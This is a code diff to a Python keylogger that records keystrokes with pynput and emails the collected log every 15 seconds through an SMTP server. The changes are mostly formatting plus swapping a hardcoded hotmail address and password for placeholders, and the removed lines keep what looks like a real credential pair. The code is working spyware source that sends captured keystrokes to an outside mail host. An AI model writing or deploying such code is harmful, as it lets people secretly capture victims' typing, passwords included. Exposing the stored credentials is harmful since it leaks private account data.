@@ -4,6 +4,7 @@ import threading
 
 log = ""
 
+
 def callbackFunction(key):
     global log
     try:
@@ -19,19 +20,22 @@ def callbackFunction(key):
 
     print(log)
 
+
 def sendEmail(email, password, message):
-    emailServer = smtplib.SMTP("smtp.live.com",25)
+    emailServer = smtplib.SMTP("smtp.live.com", 25)
     emailServer.starttls()
-    emailServer.login(email,password)
-    emailServer.sendmail(email,email,message)
+    emailServer.login(email, password)
+    emailServer.sendmail(email, email, message)
     emailServer.quit()
+
 
 def threadFunction():
     global log
-    sendEmail("cybersec111@hotmail.com", "babaci1234", log.encode("utf-8"))
+    sendEmail("user@hotmail.com", "password", log.encode("utf-8"))
     log = ""
-    timerObject = threading.Timer(15,threadFunction)
+    timerObject = threading.Timer(15, threadFunction)
     timerObject.start()
+
 
 keyloggerListener = pynput.keyboard.Listener(on_press=callbackFunction)
 
@@ -39,4 +43,3 @@ keyloggerListener = pynput.keyboard.Listener(on_press=callbackFunction)
 with keyloggerListener:
     threadFunction()
     keyloggerListener.join()
-
